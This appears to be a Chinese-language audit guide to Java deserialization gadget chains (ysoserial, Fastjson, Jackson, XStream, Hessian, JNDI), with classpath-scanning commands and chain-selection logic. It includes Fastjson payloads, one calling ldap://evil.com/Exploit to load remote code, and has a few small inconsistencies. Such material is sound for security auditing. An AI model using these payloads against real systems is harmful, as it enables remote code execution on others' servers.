# Classpath Gadget 链分析指南

## 目录

- [1. ysoserial Gadget 链矩阵](#1-ysoserial-gadget-链矩阵)
- [2. Classpath Gadget 库检测](#2-classpath-gadget-库检测)
- [3. Fastjson/Jackson Gadget 链](#3-fastjsonjackson-gadget-链)
- [4. XStream/Hessian Gadget 链](#4-xstreamhessian-gadget-链)
- [5. JNDI + 本地 Gadget 链](#5-jndi--本地-gadget-链)
- [6. Gadget 链可存活分析](#6-gadget-链可用性分析)

---

## 1. ysoserial Gadget 链矩阵

### 完整 ysoserial 利用链速查

| 链名 | 必需库 | JDK 限制 | 利用方式 | 稳定性 |
|------|--------|---------|---------|--------|
| CommonsCollections1 | commons-collections 3.x | ≤ 8u71 | AnnotationInvocationHandler | 高 |
| CommonsCollections2 | commons-collections 4.x | 无 | PriorityQueue + TransformingComparator | 高 |
| CommonsCollections3 | commons-collections 3.x | ≤ 8u71 | 同 CC1 + TemplatesImpl | 高 |
| CommonsCollections4 | commons-collections 4.x | 无 | 同 CC2 | 高 |
| CommonsCollections5 | commons-collections 3.x | 无 | BadAttributeValueExpException | 高 |
| CommonsCollections6 | commons-collections 3.x | 无 | HashSet | 高 |
| CommonsCollections7 | commons-collections 3.x | 无 | Hashtable | 中 |
| CommonsBeanutils1 | commons-beanutils 1.9.x | 无 | BeanComparator | 极高 |
| Spring1 | spring-core + spring-beans | 无 | MethodInvokeTypeProvider | 中 |
| Spring2 | spring-core + spring-beans | 无 | 同 Spring1 | 中 |
| Groovy1 | groovy 2.x | ≤ 8u191 | ConvertedClosure | 高 |
| Jdk7u21 | 无 (JDK 内置) | ≤ 7u21 | AnnotationInvocationHandler | 低 |
| Jdk8u20 | 无 (JDK 内置) | ≤ 8u20 | 同 Jdk7u21 | 低 |
| ROME | rome | 无 | ToStringBean | 高 |
| C3P0 | c3p0 | 无 | JndiRefConnectionPoolDataSource | 高 |
| Click1 | click-nodeps | 无 | ColumnComparator | 高 |
| Wicket1 | wicket | 无 | DiskFileItem | 高 |
| FileUpload1 | commons-fileupload | 无 | DiskFileItem | 高 |
| AspectJWeaver | aspectj | 无 | 写文件 | 中 |
| URLs | 无 (JDK 内置) | 无 | URL DNS 探测 | 低 (不出网) |
| Hibernate1 | hibernate | 无 | BasicPropertyAccessor | 中 |
| Hibernate2 | hibernate5 | 无 | ComponentType | 中 |
| JSON1 | fastjson | 无 | JdbcRowSetImpl | 高 |
| Jython1 | jython | 无 | PyFunction | 低 |

### 最常用的 5 条链（覆盖 80% 场景）

```
1. CommonsCollections5/6/7 — commons-collections 3.x (最广泛)
2. CommonsBeanutils1 — commons-beanutils 1.9.x (无 JDK 限制!)
3. Spring1/Spring2 — spring-core + spring-beans (Spring 项目必备)
4. URLDNS — JDK 内置 (至少可探测)
5. C3P0 / JdbcRowSetImpl (JNDI 链) — 广泛存在
```

---

## 2. Classpath Gadget 库检测

### 2.1 自动扫描命令

```bash
# 扫描 WEB-INF/lib 中是否有已知 gadget 库
find {source_path} -name "*.jar" | grep -iE \
  "commons-collections|commons-beanutils|commons-logging|commons-fileupload|commons-io" | \
  sort -t/ -f

# Spring 系列
find {source_path} -name "*.jar" | grep -iE "spring-core|spring-beans|spring-aop|spring-context"

# 其他 gadget
find {source_path} -name "*.jar" | grep -iE \
  "groovy|aspectj|jython|rome|c3p0|hessian|jboss|wicket|mojarra|myfaces|hibernate|vaadin"

# Fastjson/Jackson
find {source_path} -name "*.jar" | grep -iE "fastjson|jackson-databind|jackson-core"
```

### 2.2 版本确认

```bash
# 提取精确版本号
find . -name "commons-collections*.jar" -exec basename {} \;
# commons-collections-3.2.2.jar
# commons-collections4-4.4.0.jar

# 从 pom.xml 获取版本
grep -A5 "commons-collections\|commons-beanutils\|spring-core" pom.xml | grep version
```

### 2.3 Gadget 库存在性判定表

| gadget 库 | 检出文件 | 可用链 | JDK 限制 |
|-----------|---------|--------|---------|
| commons-collections-3.x.jar | commons-collections | CC1/3/5/6/7 | CC1/CC3: ≤ 8u71 |
| commons-collections4-4.x.jar | commons-collections4 | CC2/4/8 | 无 |
| commons-beanutils-1.9.x.jar | commons-beanutils | CB1 | 无 (!) |
| spring-core + spring-beans | spring-* | Spring1/2 | 需版本匹配 |
| groovy-2.x.jar | groovy | Groovy1 | ≤ 8u191 |
| fastjson-1.2.x.jar | fastjson | JSON1 (JNDI) | 无 (走 JNDI) |

---

## 3. Fastjson/Jackson Gadget 链

### Fastjson 利用链分类

```
类型 A: JNDI 链 (JdbcRowSetImpl)
  Payload: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}
  条件: 目标出网 (JDK ≤ 8u191 或 trustURLCodebase=true)
  风险: 🔴

类型 B: TemplatesImpl 字节码加载
  Payload: {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":[...],"_name":"","_tfactory":{}}
  条件: 需 Feature.SupportNonPublicField 开启
  风险: 🔴 但条件苛刻

类型 C: BasicDataSource BCEL 链
  Payload: {"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader":{...},"driverClassName":"$$BCEL$$..."}
  条件: 需 tomcat-dbcp 在 classpath
  风险: 🔴 条件苛刻

类型 D: expectClass 绕过 (1.2.48-1.2.68)
  通过 Throwable/RowSet/AutoCloseable 继承链 → 绕过 autoType 检查
  条件: JDK 特定版本 + 特定类在 classpath
```

### Jackson Gadget 条件

```
enableDefaultTyping 开启 + classpath 中有任一 gadget 库 → RCE

Jackson 不绑定特定 gadget，而是通过多态反序列化实例化 classpath 中的任意类。
只要满足以下条件之一即可：
1. classpath 含 commons-collections (走 CC 链)
2. classpath 含 commons-beanutils (走 CB 链)
3. classpath 含 spring-beans (走 Spring 链)
4. classpath 含 JdbcRowSetImpl (JDK 内置, 走 JNDI)
```

---

## 4. XStream/Hessian Gadget 链

### XStream

```
XStream 反序列化不同于 Java 原生，不使用 readObject() 链。
利用方式：
1. 通过特定 Converter 触发 hashCode/equals/toString → 类似 CC 链
2. 常见触发类: EventHandler, ProcessBuilder, ImageIO
3. XStream 自身 CVE 利用链（见 CVE 速查表）

审计重点：
- 是否设置了 Permission 白名单？
- 版本号是否在 CVE 范围内？
- Converter 注册列表是否有自定义危险 Converter？
```

### Hessian

```
Hessian 反序列化自定义了序列化格式，不同于 Java 原生。
可利用的 gadget：
1. HashMap + equals 触发 → CC 链变体
2. Spring PropertyPathFactoryBean 链
3. Rome ToStringBean 链
4. Resin 自身的 Hessian gadget

Hessian 特有的利用条件：
- 不需要实现 Serializable 接口
- 可以通过 Map/Collection 的 hashCode/equals 触发
- JDK 版本无限制（不依赖 readObject 机制）
```

---

## 5. JNDI + 本地 Gadget 链

### JDK ≥ 8u191 后的利用

JFDI 远程加载被禁止后，Attack 方向变为 JNDI + 本地 gadget：

```
JDK ≥ 8u191 时，lookup(ldap://evil.com/Exploit) 无法远程加载 Exploit.class
但攻击者仍可以：

1. 返回 LDAP Reference → 目标反序列化 Reference 时触发本地 gadget
2. 返回序列化对象 → 目标反序列化时触发本地 gadget
3. 利用 Java Serialized Object → LDAP 的 javaSerializedData 属性

关键：仍需 classpath 中存在可用的 gadget 库
```

### 攻击可行性判定

```
JDK ≤ 8u113:
  JNDI 注入 → 直接 RCE (远程加载恶意类)

JDK 8u113-8u191:
  JNDI 注入 → 需 trustURLCodebase=true → RCE

JDK ≥ 8u191:
  JNDI 注入 → 需 classpath gadget → RCE
  无法远程加载 → 但仍可通过本地 gadget 链反序列化
  判定: classpath 有 gadget? → 🔴 有 / 🟡 无
```

---

## 6. Gadget 链可用性分析

### 判定公式

```
Gadget 可用性 = f(库存在, 版本匹配, JDK 匹配, 链类型兼容)

对于找到的每个反序列化入口，按如下流程判定：

1. 确定反序列化类型:
   Java 原生 → 查 ysoserial 矩阵
   Fastjson → 查 Fastjson 利用链
   Jackson → 任意 classpath gadget 均可
   Hessian → 查 Hessian 专用 gadget
   XStream → 查 CVE + Converter 分析

2. 匹配 gadget 库:
   classpath 有哪些 gadget 库？
   → commons-collections 3.x → CC5/6/7 (无 JDK 限制!)
   → commons-beanutils → CB1 (无 JDK 限制!)
   → spring-beans → Spring1/2
   → 无任何 gadget → URLDNS (至少可探测)

3. JDK 版本过滤:
   → 检查 JDK 版本 → 过滤不兼容的链
   → CC1/3: JDK ≤ 8u71
   → Groovy1: JDK ≤ 8u191
   → CB1: 无 JDK 限制!

4. 输出最终可用链:
   → 列出所有可用链 + 所需条件
   → 标记最稳定的一条作为首选 PoC 链
```

### 实战经验

从审计实践中总结的关键点：

1. **commons-beanutils 是最大的隐藏风险** — 很多项目不认为它是 gadget 库，但它提供了 CB1 链，且无 JDK 限制。

2. **Spring 项目天然含 gadget** — spring-beans 提供 Spring1/2 链，无需额外依赖。

3. **即使无 gadget 也有 URLDNS** — 至少可验证反序列化漏洞是否存在（通过 DNS 探测确认 readObject 被执行）。

4. **CC3-6 依赖 JDK 版本** — CC5/CC6/CC7 无 JDK 限制，优先测试。

5. **Hessian/Dubbo 场景** — 传统 ysoserial 链不适用，需专门的 Hessian gadget 研究。
